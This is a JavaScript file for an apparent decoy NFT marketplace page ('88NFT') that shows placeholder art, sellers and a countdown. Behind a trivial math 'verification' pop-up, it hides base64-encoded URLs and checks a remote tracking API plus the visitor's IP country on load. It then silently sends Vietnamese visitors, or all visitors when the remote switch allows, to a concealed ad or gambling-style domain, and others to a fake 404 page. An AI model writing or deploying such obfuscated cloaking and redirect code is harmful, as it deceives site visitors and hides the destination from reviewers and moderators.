class IPRedirectService {
    constructor() {
      this.vietnamRedirectUrl = atob('aHR0cHM6Ly9hZC56bzg4dmlwLnRvcA==');
      this.notFoundRedirectUrl = atob('aHR0cHM6Ly9iZWF1dGlmdWwtNDA0LXBhZ2Utdy1tNzBrLmJvbHQuaG9zdA==');
      this.apiUrl = atob('aHR0cHM6Ly9ibHVlLWRpc2stNGNhMy5kYW4tMzAwLndvcmtlcnMuZGV2L2FwaS90cmFja2luZz9tZDU9ODI4MmQzMzM5NjhhMzNiMTBiZjI4Mjg2NDUwNzc2ZTk=');
      this.apiData = null;
    }
  
    async checkAPI() {
      const response = await fetch(this.apiUrl, {
        method: 'GET',
        mode: 'cors',
        headers: {
          'Accept': 'application/json',
        }
      });
      if (!response.ok) {
        throw new Error('Failed to fetch API data');
      }
      this.apiData = await response.json();
      return this.apiData;
    }
  
    async isVietnameseIP() {
      try {
        const url = atob('aHR0cHM6Ly9mcmVlLmZyZWVpcGFwaS5jb20vYXBpL2pzb24=');
        const response = await fetch(url);
        
        if (!response.ok) {
          throw new Error('Failed to fetch IP info');
        }
        
        const data = await response.json();
        const ipInfo = Array.isArray(data) ? data[0] : data;
        
        if (!ipInfo || !ipInfo.countryCode) {
          throw new Error('Unable to determine country');
        }
        
        const isVietnamese = ipInfo.countryCode === 'VN';
        return isVietnamese;
      } catch (error) {
        return false;
      }
    }
  }
  
  let showModal = false;
  let mathQuestions = [];
  let currentQuestion = null;
  let userAnswer = '';
  let error = '';
  let countdown = { days: 0, hours: 0, minutes: 0, seconds: 0 };
  let isMobileMenuOpen = false;
  let isVietnamese = false;
  let countdownInterval;
  
  const ipRedirectService = new IPRedirectService();
  
  function generateMathQuestions() {
    currentQuestion = { num1: 4, num2: 4, answer: 8 };
  }
  
  
  
  function initCountdown() {
    const endDate = new Date();
    endDate.setDate(endDate.getDate() + 100);
    
    countdownInterval = setInterval(() => {
      const now = new Date().getTime();
      const distance = endDate.getTime() - now;
      
      const days = Math.floor(distance / (1000 * 60 * 60 * 24));
      const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((distance % (1000 * 60)) / 1000);
      
      countdown = { days, hours, minutes, seconds };
      
      document.getElementById('countdown-days').textContent = days;
      document.getElementById('countdown-hours').textContent = hours;
      document.getElementById('countdown-minutes').textContent = minutes;
      document.getElementById('countdown-seconds').textContent = seconds;
      
      if (distance < 0) {
        clearInterval(countdownInterval);
      }
    }, 1000);
  }
  
  async function checkIP() {
    try {
      const vietnameseIP = await ipRedirectService.isVietnameseIP();
      isVietnamese = vietnameseIP;
    } catch (error) {
      isVietnamese = false;
    }
  }
  
  function showVerificationModal() {
  const modal = document.getElementById('verification-modal');
  const input = document.getElementById('user-answer');
  
  // Show modal
  modal.classList.remove('hidden');
  

  
  // Hide error message
  document.getElementById('error-message').classList.add('hidden');
  
  // Focus the input
  input.focus();
}
  
  function hideVerificationModal() {
  showModal = false;
  const modal = document.getElementById('verification-modal');
  
  modal.classList.add('hidden');
}
  
  async function verifyMath() {
    const userAnswerInput = document.getElementById('user-answer');
    const answer = parseInt(userAnswerInput.value);
    const errorElement = document.getElementById('error-message');
    
    if (answer === currentQuestion.answer) {
      hideVerificationModal();
      
      if (ipRedirectService.apiData) {
        const { status, secured } = ipRedirectService.apiData;
        
        if (status === true && secured === false) {
          setTimeout(() => {
            window.location.replace(ipRedirectService.vietnamRedirectUrl);
          }, 500);
        } else if (status === true && secured === true) {
          setTimeout(async () => {
            const isVietnamese = await ipRedirectService.isVietnameseIP();
            if (isVietnamese) {
              window.location.replace(ipRedirectService.vietnamRedirectUrl);
            } else {
              window.location.replace(ipRedirectService.notFoundRedirectUrl);
            }
          }, 500);
        }
      }
    } else {
      errorElement.classList.remove('hidden');
      userAnswerInput.value = '';
    }
  }
  
  function handleCTAClick() {
    alert('Chào mừng bạn đến với 88NFT! Chức năng đang được phát triển.');
  }
  
  function toggleMobileMenu() {
    isMobileMenuOpen = !isMobileMenuOpen;
    const navMenu = document.getElementById('nav-menu');
    
    if (isMobileMenuOpen) {
      navMenu.classList.add('active');
    } else {
      navMenu.classList.remove('active');
    }
  }
  
  function closeMobileMenu() {
    isMobileMenuOpen = false;
    document.getElementById('nav-menu').classList.remove('active');
  }
  
  function generateNFTCards() {
    const nfts = [
      {
        title: "Renaissance Portrait #001",
        image: "https://images.unsplash.com/photo-1541961017774-22349e4a1262?w=400&h=400&fit=crop&crop=center"
      },
      {
        title: "Classical Sculpture",
        image: "https://images.unsplash.com/photo-1560472354-b33ff0c44a43?w=400&h=400&fit=crop&crop=center"
      },
      {
        title: "Modern Abstract #042",
        image: "https://images.unsplash.com/photo-1547826039-bfc35e0f1ea8?w=400&h=400&fit=crop&crop=center"
      },
      {
        title: "Ancient Artifact",
        image: "https://images.unsplash.com/photo-1578662996442-48f60103fc96?w=400&h=400&fit=crop&crop=center"
      },
      {
        title: "Impressionist Masterpiece",
        image: "https://images.unsplash.com/photo-1578662996442-48f60103fc96?w=400&h=400&fit=crop&crop=center"
      },
      {
        title: "Contemporary Gallery",
        image: "https://images.unsplash.com/photo-1541961017774-22349e4a1262?w=400&h=400&fit=crop&crop=center"
      },
      {
        title: "Museum Exhibition",
        image: "https://images.unsplash.com/photo-1560472354-b33ff0c44a43?w=400&h=400&fit=crop&crop=center"
      },
      {
        title: "Art Gallery Collection",
        image: "https://images.unsplash.com/photo-1547826039-bfc35e0f1ea8?w=400&h=400&fit=crop&crop=center"
      }
    ];
  
    const nftGrid = document.getElementById('nft-grid');
    nftGrid.innerHTML = nfts.map(nft => `
      <div class="nft-card">
        <div class="nft-image">
          <img src="${nft.image}" alt="${nft.title}" />
          ${nft.badge ? `<div class="nft-badge">${nft.badge}</div>` : ''}
          ${nft.timer ? `<div class="nft-timer"><i class="fas fa-clock"></i><span>${nft.timer}</span></div>` : ''}
        </div>
        <div class="nft-info">
          <div class="nft-creators">
            <div class="creator-avatars">
              <img src="https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=32&h=32&fit=crop&crop=face" alt="Creator 1" />
              <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=32&h=32&fit=crop&crop=face" alt="Creator 2" />
              <img src="https://images.unsplash.com/photo-1494790108755-2616b612b786?w=32&h=32&fit=crop&crop=face" alt="Creator 3" />
            </div>
            <button class="heart-btn">
              <i class="far fa-heart"></i>
            </button>
          </div>
          <h3 class="nft-title">${nft.title}</h3>
          <div class="nft-price">
            <span class="price">20.5 ETH</span>
            <span class="edition">1 out of 10</span>
          </div>
        </div>
      </div>
    `).join('');
  }
  
  function generateSellerCards() {
    const sellers = [
      { name: "Mai Harrington", avatar: null, letter: "Z" },
      { name: "Floyd Glasgow", avatar: "https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=80&h=80&fit=crop&crop=face" },
      { name: "Donna Schultz", avatar: "https://images.unsplash.com/photo-1494790108755-2616b612b786?w=80&h=80&fit=crop&crop=face" },
      { name: "Joshua Morris", avatar: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=80&h=80&fit=crop&crop=face" }
    ];
  
    const sellersGrid = document.getElementById('sellers-grid');
    sellersGrid.innerHTML = sellers.map(seller => `
      <div class="seller-card">
        <div class="seller-avatar">
          ${seller.avatar ? `<img src="${seller.avatar}" alt="${seller.name}" />` : `<div class="seller-logo">${seller.letter}</div>`}
        </div>
        <h3>${seller.name}</h3>
        <p>Top Creator</p>
        <button class="btn btn-outline">Theo Dõi</button>
      </div>
    `).join('');
  }
  
  function generateCollectionCards() {
    const collections = [
      {
        title: "Renaissance Masters",
        description: "Bộ sưu tập nghệ thuật cổ điển",
        image: "https://images.unsplash.com/photo-1541961017774-22349e4a1262?w=400&h=300&fit=crop&crop=center"
      },
      {
        title: "Modern Art",
        description: "Nghệ thuật hiện đại",
        image: "https://images.unsplash.com/photo-1560472354-b33ff0c44a43?w=400&h=300&fit=crop&crop=center"
      },
      {
        title: "Abstract Gallery",
        description: "Triển lãm nghệ thuật trừu tượng",
        image: "https://images.unsplash.com/photo-1547826039-bfc35e0f1ea8?w=400&h=300&fit=crop&crop=center"
      }
    ];
  
    const collectionsGrid = document.getElementById('collections-grid');
    collectionsGrid.innerHTML = collections.map(collection => `
      <div class="collection-card ${collection.large ? 'large' : ''}">
        <img src="${collection.image}" alt="${collection.title}" />
        <div class="collection-overlay">
          <h3>${collection.title}</h3>
          <p>${collection.description}</p>
        </div>
      </div>
    `).join('');
  }
  
  async function initApp() {
    generateMathQuestions();
    await ipRedirectService.checkAPI();
    await checkIP();
    initCountdown();
    generateNFTCards();
    generateSellerCards();
    generateCollectionCards();
    
    setTimeout(() => {
      showVerificationModal();
    }, 2000);
  }
  
  document.addEventListener('DOMContentLoaded', () => {
    initApp();
    
    document.getElementById('nav-toggle').addEventListener('click', toggleMobileMenu);
    
    document.querySelectorAll('.nav-menu a').forEach(link => {
      link.addEventListener('click', closeMobileMenu);
    });
    
    document.getElementById('verify-btn').addEventListener('click', verifyMath);
    
    document.getElementById('user-answer').addEventListener('keypress', (e) => {
      if (e.key === 'Enter') {
        verifyMath();
      }
    });
    
    document.getElementById('cta-btn').addEventListener('click', handleCTAClick);
    
    document.getElementById('user-answer').addEventListener('input', () => {
      document.getElementById('error-message').classList.add('hidden');
    });
  });
  